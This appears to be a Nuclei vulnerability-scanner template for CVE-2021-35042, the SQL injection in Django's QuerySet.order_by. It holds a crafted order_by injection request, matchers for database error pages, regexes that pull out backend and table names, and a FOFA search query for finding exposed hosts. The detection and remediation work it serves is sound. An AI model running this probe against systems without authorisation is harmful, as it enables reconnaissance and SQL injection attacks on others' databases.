http:
- extractors:
  - group: 1
    name: database
    part: body
    regex:
    - django\.db\.backends\.(postgresql|mysql|sqlite3|oracle)
    type: regex
  - group: 1
    name: tables
    part: body
    regex:
    - FROM\s+"([a-zA-Z_][a-zA-Z0-9_]*)"
    - FROM\s+`([a-zA-Z_][a-zA-Z0-9_]*)`
    - relation\s+([a-zA-Z_][a-zA-Z0-9_]*)
    - Table\s+'[^']*\.([a-zA-Z_][a-zA-Z0-9_]*)'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 500
    - contains_all(body, "ProgrammingError", "ORDER BY") || contains_all(body, "DatabaseError",
      "ORDER BY")
    - contains_any(body, "psycopg2", "MySQLdb", "sqlite3", "cx_Oracle")
    type: dsl
  raw:
  - 'GET /?order_by=vuln.x]-- HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-35042
info:
  author: 0x_Akoko
  classification:
    cve-id: CVE-2021-35042
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.97082
    epss-score: 0.38424
  description: 'Django 3.1.x before 3.1.13 and 3.2.x before 3.2.5 contain a SQL injection
    caused by untrusted input in QuerySet.order_by, letting attackers execute arbitrary
    SQL commands, exploit requires attacker to control order_by input.

    '
  impact: 'Attackers can execute arbitrary SQL commands, potentially leading to data
    leakage, modification, or deletion.

    '
  metadata:
    fofa-query: body="ProgrammingError" && body="ORDER BY"
    max-request: 1
    verified: true
  name: Django QuerySet.order_by - SQL Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-35042
  - https://github.com/zer0qs/CVE-2021-35042
  - https://github.com/django/django/commit/a34a5f724c5d5adb2109374ba3989ebb7b11f81f
  remediation: 'Update to Django 3.1.13 or 3.2.5 or later versions.

    '
  severity: critical
  tags: cve,cve2021,django,sqli
